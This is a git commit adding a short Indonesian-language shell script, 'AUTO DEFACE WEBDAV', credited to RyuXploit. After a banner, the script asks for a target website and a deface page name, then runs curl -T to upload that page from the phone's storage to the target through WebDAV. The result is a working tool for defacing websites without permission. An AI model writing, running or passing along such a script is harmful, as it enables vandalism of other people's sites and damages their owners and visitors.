b174ce4d6fab7bdc6eda5a1be7e45d3e430c6a26
Probolinggo Cyber Security <59297302+RyuXploit@users.noreply.github.com>
2020-02-09 17:22:11 +0700

    Add files via upload

---
+++ webdav.sh
@@ -0,0 +1,22 @@
+#WEBDAV BY RYUXPLOIT
+#HWHWHWHWHHW
+
+clear
+figlet WEBDAV | lolcat
+echo " ######################################
+
+[+] Nama Tool : AUTO DEFACE WEBDAV
+[+] Author    : RyuXploit AKA JayaKusuma
+[+] Youtube   : BACOTAN ANAK IT
+[+] Ig        : jayakusuma404
+[+] Blog      : https://www.ryuxploit.blogspot.com
+[+] Status    : joned:v
+[+] No Wa     : -
+
+###################################### " | lolcat
+
+read -p " Website Target ==> " target;
+read -p " Nama sript Defacenya ==> " sc;
+curl -T /storage/emulated/0/$sc $target
+echo " [!] Suksess... "
+figlet Sukses | lolcat
